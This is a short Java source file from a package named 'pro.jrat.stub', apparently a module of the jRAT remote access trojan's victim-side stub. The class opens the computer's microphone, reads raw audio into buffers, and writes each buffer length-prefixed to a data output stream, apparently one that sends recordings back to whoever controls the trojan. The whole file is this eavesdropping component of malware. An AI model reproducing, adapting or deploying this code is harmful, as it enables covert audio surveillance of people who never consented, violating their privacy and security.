package pro.jrat.stub;
import java.io.DataOutputStream;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.TargetDataLine;


public class Sound {
	
	public static AudioFormat format;
	public static DataLine.Info info;
	public static TargetDataLine line;
	
	public static void initialize() throws Exception {
		if (line != null) {
			line.close();
		}
		format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
		info = new DataLine.Info(TargetDataLine.class, format);
		line = (TargetDataLine) AudioSystem.getLine(info);
		line.open();
		line.start();
	}
	
	public static void write(DataOutputStream dos) throws Exception {	
		byte[] data = new byte[line.getBufferSize() / 5];
		
		line.read(data, 0, data.length);
		
		dos.writeInt(data.length);
        dos.write(data);
	}

}
